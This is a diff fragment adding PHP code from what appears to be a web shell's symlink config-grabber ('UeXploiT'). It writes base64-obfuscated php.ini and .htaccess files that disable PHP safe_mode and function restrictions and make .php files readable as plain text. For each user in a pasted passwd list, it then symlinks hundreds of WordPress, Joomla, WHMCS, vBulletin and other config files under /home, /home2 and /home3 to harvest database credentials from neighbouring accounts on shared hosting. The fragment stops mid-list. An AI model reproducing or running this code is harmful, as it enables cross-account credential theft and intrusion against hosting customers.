+                        $php_ini_content = "c2FmZV9tb2RlID0gT0ZGCglTYWZlX21vZGVfZ2lkID0gT0ZGCglkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUKCWRpc2FibGVfY2xhc3NlcyA9IE5PTkUKCW9wZW5fYmFzZWRpciA9IE9GRgoJc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkUg";
+                        $php_ini = fopen("php.ini", "w");
+                        fwrite($php_ini, base64_decode($php_ini_content));
+                        fclose($php_ini);
+
+                        $function = @ini_get("disable_functions");
+                        if (eregi("symlink", $function)) {
+                            die('<error>Symlink is disabled :\'( </error>');
+                        } else {
+                            @mkdir('UeXploiT', 0755);
+                            @chdir('UeXploiT');                        
+                            $passwd = $_POST["passwd"];
+
+                        $htaccess_content = "T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kKT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkZvcmNlVHlwZSB0ZXh0L3BsYWluCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIApBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwKQWRkVHlwZSB0ZXh0L2h0bWwgLnNodG1sCkFkZFR5cGUgdHh0IC5waHAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAKQWRkSGFuZGxlciB0eHQgLnBocApBZGRIYW5kbGVyIHR4dCAuaHRtbApBZGRIYW5kbGVyIHR4dCAuc2h0bWwKT3B0aW9ucyBBbGwKT3B0aW9ucyBBbGw=";
+                        $htaccess = fopen(".htaccess", "w");
+                        fwrite($htaccess, base64_decode($htaccess_content));
+                        fclose($htaccess);
+
+                            $passwd = explode("
+", $passwd);
+                            foreach ($passwd as $pwd) {
+                                $pawd = explode(":", $pwd);
+                                $user = $pawd[0];
+@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
+@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
+@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
+@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
+@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
+@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
+@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
+@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
+@symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
+@symlink('/home/' . $user . '/public_html/library/config.php', $user . '-symlink');
+@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
+@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
+@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
+@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
+@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
+@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
+@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
+@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
+@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
+@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
+@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
+@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
+@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
+@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
+@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
+@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
+@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
+@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
+@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
+@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
+@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
+@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
+@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
+@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
+@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
+@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
+@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
+@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
+@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
+@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
+@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
+@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
+@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
+@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
+@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
+@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
+@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
+@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
+@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
+@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
+@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
+@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
+@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
+@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
+@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
+@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
+@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
+@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
+@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
+@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
+@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
+@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
+@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
+@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
+@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
+@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
+@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
+@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
+@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
+@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
+@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
+@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
+@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
+@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
+@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
+@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
+@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
+@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
+@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
+@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
+@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
+@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
+@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/db.php', $user . '-clientarea-WHMCS.txt');
+@symlink('/home/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
+@symlink('/home/' . $user . '/public_html/connect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/admin/connect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/include/connect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/dbconnect.php', $user . '-normal');
+@symlink('/home/' . $user . '/public_html/connection.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
+@symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
+@symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
+@symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
+@symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
+@symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
+@symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
+@symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
+@symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
+@symlink('/home2/' . $user . '/public_html/library/config.php', $user . '-symlink');
+@symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
+@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
+@symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
+@symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
+@symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
+@symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
+@symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
+@symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
+@symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
+@symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
+@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
+@symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
+@symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
+@symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
+@symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
+@symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
+@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
+@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
+@symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
+@symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
+@symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
+@symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
+@symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
+@symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
+@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
+@symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
+@symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
+@symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
+@symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
+@symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
+@symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
+@symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
+@symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
+@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
+@symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
+@symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
+@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
+@symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
+@symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
+@symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
+@symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
+@symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
+@symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
+@symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
+@symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
+@symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
+@symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
+@symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
+@symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
+@symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
+@symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
+@symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
+@symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
+@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
+@symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
+@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
+@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
+@symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
+@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
+@symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
+@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
+@symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
+@symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
+@symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
+@symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
+@symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
+@symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
+@symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
+@symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
+@symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
+@symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
+@symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
+@symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
+@symlink('/home2/' . $user . '/public_html/db.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
+@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/admin/connect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/include/connect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/dbconnect.php', $user . '-normal');
+@symlink('/home2/' . $user . '/public_html/admin/connection.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
+@symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
+@symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
+@symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
+@symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
+@symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
+@symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
+@symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
+@symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
+@symlink('/home3/' . $user . '/public_html/library/config.php', $user . '-symlink');
+@symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
+@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
+@symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
+@symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
+@symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
+@symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
+@symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
+@symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
+@symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
+@symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
+@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
+@symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
+@symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
+@symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
+@symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
+@symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
+@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
+@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
+@symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
+@symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
+@symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
+@symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
+@symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
+@symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
